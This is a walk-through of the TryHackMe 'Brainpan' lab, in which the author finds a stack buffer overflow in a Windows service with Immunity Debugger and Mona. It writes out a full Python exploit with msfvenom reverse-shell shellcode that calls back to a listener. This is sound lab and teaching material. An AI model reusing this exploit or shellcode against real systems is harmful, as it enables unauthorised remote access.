---
title: "Walk-through of Brainpan from TryHackMe"
header:
  teaser: /assets/images/2021-04-19-15-56-52.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - Buffer Overflow
  - Immunity
  - Mona
  - gobuster
---

## Machine Information

![brainpan](/assets/images/2021-04-19-15-56-52.png)

Brainpan is rated as a hard difficulty room on TryHackMe. This Windows based server has only two open ports. We find an application called Brainpan listening on port 9999. We also find a hidden bin folder on a website where we grab the binary for the application. From there we reverse engineer the application to work out how we can exploit a buffer overflow vulnerability. We then write a custom python script to gain a reverse shell on to the server.

<!--more-->
Skill required are a basic understanding of the tools and techniques needed to debug an application. Skills learned are a better understanding of EIP, ESP and other registers that we can use to help us develop an exploit. We also learn a little about Immunity Debugger for Windows.

I have done other buffer overflow rooms on TryHackMe. See [Brainstorm](https://pencer.io/ctf/ctf-thm-brainstorm/), [Gatekeeper](https://pencer.io/ctf/ctf-thm-gatekeeper/) and [Buffer Overflow Prep](https://pencer.io/ctf/ctf-thm-bofprep/) for more walk-throughs.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Brainpan](https://tryhackme.com/room/brainpan) |
| Machine Release Date | 5th August 2019 |
| Date I Completed It | 19th April 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.251.150 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 
┌──(root💀kali)-[~/thm/brainpan]
└─# nmap -p$ports -sC -sV -oA brainpan 10.10.251.150
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 21:04 BST
Nmap scan report for 10.10.251.150
Host is up (0.029s latency).

PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=4/18%Time=607C90C4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
<SNIP>
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.24 seconds
```

Just two ports open, with 9999 most likely being the vulnerable application, and port 10000 looks to be a website. First let's add the IP of the server to our hosts file:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# echo 10.10.251.150 brainpan.thm >> /etc/hosts
```

Now let's check out the application on port 9999 first:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# nc brainpan.thm 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> password
                          ACCESS DENIED
```

We know this is a buffer overflow room, let's try sending a long string of characters:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# python -c 'print "A" * 1000'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

┌──(root💀kali)-[~/thm/brainpan]
└─# nc brainpan.thm 9999        
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

No access denied message this time, so looks like we overran the buffer. If we try and connect again we see the application appears to be broken now:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# nc brainpan.thm 9999
brainpan.thm [10.10.251.150] 9999 (?) : Connection refused
```

With nothing more we can do on that port, let's have a look at the website on port 10000:

![brainpan-website](/assets/images/2021-04-18-21-09-42.png)

We find just a single picture on the website, with nothing else obvious. Let's try looking for subfolders with gobuster:

```text
──(root💀kali)-[~/thm/brainpan]
└─# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://brainpan.thm:10000
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://brainpan.thm:10000
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/04/18 21:12:21 Starting gobuster in directory enumeration mode
===============================================================
http://brainpan.thm:10000/bin                  (Status: 301) [Size: 0] [--> /bin/]
===============================================================
2021/04/18 21:25:43 Finished
===============================================================
```

We've found subfolder called bin, let's have a look:

![website-bin](/assets/images/2021-04-18-21-32-07.png)

We can assume this is the same application running on port 9999, let's grab it:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# wget http://brainpan.thm:10000/bin/brainpan.exe                                  
--2021-04-18 21:32:56--  http://brainpan.thm:10000/bin/brainpan.exe
Resolving brainpan.thm (brainpan.thm)... 10.10.251.150
Connecting to brainpan.thm (brainpan.thm)|10.10.251.150|:10000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 21190 (21K) [application/x-msdos-program]
Saving to: ‘brainpan.exe’
brainpan.exe                 100%[===========>]  20.69K  --.-KB/s    in 0.03s   
2021-04-18 21:32:56 (665 KB/s) - ‘brainpan.exe’ saved [21190/21190]
```

Now start up my Win10 VM which has Immunity and Mona installed. Browse to Kali where I've downloaded the brainpan.exe and copy it over:

![brainpan-browse](/assets/images/2021-04-18-22-06-36.png)

With the exe copied over to my Win10 machine, let's run it and see what happens:

![brainpan-run-ece](/assets/images/2021-04-18-22-11-54.png)

The application is running, and it says its listening on port 9999. Let's switch back to Kali and see if we can connect:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# nc 192.168.0.11 9999                            
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> password
                          ACCESS DENIED
```

We can confirm this is the same exe as we saw running on the server on port 10000. Time to fire up Immunity and find a way to exploit the buffer overflow.

With Immunity open press F3 and from the dialog find the brainpan.exe to start it running:

![brainpan-immunity](/assets/images/2021-04-18-22-17-10.png)

Note the status is paused in the bottom right corner, we have to set it running before we can doing anything by pressing F9.

Switch back to Kali, and send the 1000 characters again like we did before when it appeared to crash the app:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# nc 192.168.0.11 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Go back to Immunity and we will see the application has crashed, Immunity has paused it so we can look at the registers:

![brainpan-registers](/assets/images/2021-04-18-22-21-39.png)

We can see EIP is full with 41414141. That's the letter A's we sent, which shows we filled it with our input. Let's get Mona set up before we start debugging, type this is the Immunity command line:

```text
!mona config -set workingfolder c:\mona\%p
```

![brainpan-mona-config](/assets/images/2021-04-18-22-28-53.png)

That's the working folder set. Now let's create a unique pattern using Mona, which we can use to find the exact number of characters needed to crash the brainpan exe:

![brainpan-mona-pattern](/assets/images/2021-04-18-22-30-56.png)

Open the text file where the unique pattern has been saved by Mona:

![brainpan-mona-patternfile](/assets/images/2021-04-18-22-32-06.png)

Copy the ASCII line. Then back in to Immunity and restart the brainpan exe by pressing Ctrl+F2, then set it running with F9. Now switch to Kali, connect to the exe and paste the unique pattern:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# nc 192.168.0.11 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

Back to Immunity on my Win10 VM again. We'll see the exe has crashed and been paused. Type this in to the Immunity command line:

```text
!mona findmsp -distance 1000
```

Mona will search the memory to find the exact place in our unique pattern that caused the crash:

![brainpan-findmsp](/assets/images/2021-04-18-22-38-25.png)

The important line is EIP showing it has an offset of 524. This is the number of characters we need to send to crash the exe. 

Now we start to build our exploit script. Here's how it looks after putting our offset in:

```text
import socket

ip = "192.168.0.11"
port = 9999

prefix = ""
offset = 524 
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Above we can see I have the IP of my Win10 VM where the brainpan exe is running. And I've put 524 in as the offset, which we've just found. The retn is set to BBBB, this will be used to prove that we can control the contents of EIP. Let's restart the exe and ensure it's running then back to Kali and run the script:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# python exploit.py
Sending evil buffer...
Done!
```

Now back to Immunity and check EIP:

![brainpan-bbbb](/assets/images/2021-04-18-22-47-08.png)

It's looking good. Our script filled the buffer, then put four B's in to EIP. Next we need to see if there are any bad characters, we use Mona for this:

```text
!mona bytearray -b "\x00"
```

Entering that in Immunity will create an array of characters that contains every possible ASCII character in HEX format:

![brainpan-bytearray](/assets/images/2021-04-18-22-50-55.png)

 We need to send this to the exe and see if any are not useable. Open the text file Mona created and copy the array:

![brainpan-bytearray-file](/assets/images/2021-04-18-22-52-01.png)

The copied HEX needs putting in our exploit script on Kali:

```text
prefix = ""
offset = 524
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

Make sure the brainpan exe is running then run this exploit script. Now switch back to Immunity and check the registers:

![brainpan-esp](/assets/images/2021-04-18-22-57-07.png)

We need to find the value of the ESP register, then we use Mona to search memory and compare against the bytearray file we created earlier:

```text
!mona compare -f C:\mona\brainpan\bytearray.bin -a 005FF920
```

We can see from the output that our shellcode was unmodified:

![brainpan-compare](/assets/images/2021-04-18-22-56-35.png)

This means no bad characters were found in our payload. Our final job is to find the location of JMP ESP. We do this by getting Mona to look for a memory address that doesn't contain \x00:

```text
!mona jmp -r esp -cpb "\x00"
```

The output looks like this:

![brainpan-jmpesp](/assets/images/2021-04-18-23-03-53.png)

The important line is here:

```text
Log data, item 3
 Message=  0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Spen\Desktop\brainpan.exe)
```

Mona has found jmp esp at 0x311712f3. We use this in our script. One last thing to do now is create a payload using MSFVenom. This is what will be executed when our exploit overruns the buffer:

```text
┌──(root💀kali)-[~/thm/brainpan]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.25 LPORT=1234 -b '\x00' EXITFUNC=thread -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xba\x5e\x70\x37\xf9\xd9\xed\xd9\x74\x24\xf4\x5e"
payload += b"\x33\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x98"
payload += b"\x74\xd5\x0c\xd8\x9d\x9b\xef\x20\x5e\xfc\x66\xc5"
payload += b"\x6f\x3c\x1c\x8e\xc0\x8c\x56\xc2\xec\x67\x3a\xf6"
payload += b"\x67\x05\x93\xf9\xc0\xa0\xc5\x34\xd0\x99\x36\x57"
payload += b"\x52\xe0\x6a\xb7\x6b\x2b\x7f\xb6\xac\x56\x72\xea"
payload += b"\x65\x1c\x21\x1a\x01\x68\xfa\x91\x59\x7c\x7a\x46"
payload += b"\x29\x7f\xab\xd9\x21\x26\x6b\xd8\xe6\x52\x22\xc2"
payload += b"\xeb\x5f\xfc\x79\xdf\x14\xff\xab\x11\xd4\xac\x92"
payload += b"\x9d\x27\xac\xd3\x1a\xd8\xdb\x2d\x59\x65\xdc\xea"
payload += b"\x23\xb1\x69\xe8\x84\x32\xc9\xd4\x35\x96\x8c\x9f"
payload += b"\x3a\x53\xda\xc7\x5e\x62\x0f\x7c\x5a\xef\xae\x52"
payload += b"\xea\xab\x94\x76\xb6\x68\xb4\x2f\x12\xde\xc9\x2f"
payload += b"\xfd\xbf\x6f\x24\x10\xab\x1d\x67\x7d\x18\x2c\x97"
payload += b"\x7d\x36\x27\xe4\x4f\x99\x93\x62\xfc\x52\x3a\x75"
payload += b"\x03\x49\xfa\xe9\xfa\x72\xfb\x20\x39\x26\xab\x5a"
payload += b"\xe8\x47\x20\x9a\x15\x92\xe7\xca\xb9\x4d\x48\xba"
payload += b"\x79\x3e\x20\xd0\x75\x61\x50\xdb\x5f\x0a\xfb\x26"
payload += b"\x08\xf5\x54\x28\xd1\x9d\xa6\x28\xe5\x8f\x2e\xce"
payload += b"\x8f\x3f\x67\x59\x38\xd9\x22\x11\xd9\x26\xf9\x5c"
payload += b"\xd9\xad\x0e\xa1\x94\x45\x7a\xb1\x41\xa6\x31\xeb"
payload += b"\xc4\xb9\xef\x83\x8b\x28\x74\x53\xc5\x50\x23\x04"
payload += b"\x82\xa7\x3a\xc0\x3e\x91\x94\xf6\xc2\x47\xde\xb2"
payload += b"\x18\xb4\xe1\x3b\xec\x80\xc5\x2b\x28\x08\x42\x1f"
payload += b"\xe4\x5f\x1c\xc9\x42\x36\xee\xa3\x1c\xe5\xb8\x23"
payload += b"\xd8\xc5\x7a\x35\xe5\x03\x0d\xd9\x54\xfa\x48\xe6"
payload += b"\x59\x6a\x5d\x9f\x87\x0a\xa2\x4a\x0c\x2a\x41\x5e"
payload += b"\x79\xc3\xdc\x0b\xc0\x8e\xde\xe6\x07\xb7\x5c\x02"
payload += b"\xf8\x4c\x7c\x67\xfd\x09\x3a\x94\x8f\x02\xaf\x9a"
payload += b"\x3c\x22\xfa"
```

Finally we change the memory address for jmp esp to Little Endian:

```text
0x311712f3 <-> \xf3\x12\x17\x31
```

Now we have everything needed, let's assemble our script:

```text
prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload =  b""
payload += b"\xba\x5e\x70\x37\xf9\xd9\xed\xd9\x74\x24\xf4\x5e"
payload += b"\x33\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x98"
payload += b"\x74\xd5\x0c\xd8\x9d\x9b\xef\x20\x5e\xfc\x66\xc5"
payload += b"\x6f\x3c\x1c\x8e\xc0\x8c\x56\xc2\xec\x67\x3a\xf6"
payload += b"\x67\x05\x93\xf9\xc0\xa0\xc5\x34\xd0\x99\x36\x57"
<SNIP>
```

A reminder of what those mean:

```text
ip = IP address of Win10 running our brainpan.exe
port = port brainpan.exe is listening on
offset = number of bytes that will fill the buffer
overflow = will be letter A * offset
retn = address of the ESP
padding = NOP sled to ensure we hit our payload
payload = shellcode created by MSFVenom
```

Make sure the brainpan exe is running, then execute our exploit script. Finally switch to our waiting netcat listener to see we have a reverse shell connected:

```text
┌──(root💀kali)-[/home/kali]
└─# nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.0.25] from (UNKNOWN) [192.168.0.11] 51758
Microsoft Windows [Version 10.0.17134.112]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\pencer\Desktop>
```

That was nice and simple, and good practice if you've not done many of these before or you are building up to do your OCSP exam.

See you next time.
